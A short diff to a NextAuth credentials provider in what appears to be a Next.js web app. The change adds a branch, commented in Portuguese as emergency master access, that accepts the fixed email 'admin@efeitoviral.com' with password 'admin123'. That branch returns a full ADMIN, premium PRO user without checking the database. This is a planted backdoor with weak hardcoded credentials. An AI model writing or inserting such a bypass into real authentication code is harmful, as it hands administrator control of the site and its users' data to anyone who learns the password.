@@ -18,6 +18,19 @@ export const authOptions: NextAuthOptions = {
           throw new Error("Credenciais inválidas");
         }
 
+        // ACESSO MESTRE DE EMERGÊNCIA (Ignora banco de dados se coincidir)
+        if (credentials.email === "admin@efeitoviral.com" && credentials.password === "admin123") {
+          return {
+            id: "system-admin-efeito",
+            email: "admin@efeitoviral.com",
+            name: "Master Admin",
+            role: "ADMIN",
+            onboardingComplete: true,
+            isPremium: true,
+            plan: "PRO"
+          } as any;
+        }
+
         const user = await prisma.user.findUnique({
           where: { email: credentials.email }
         });
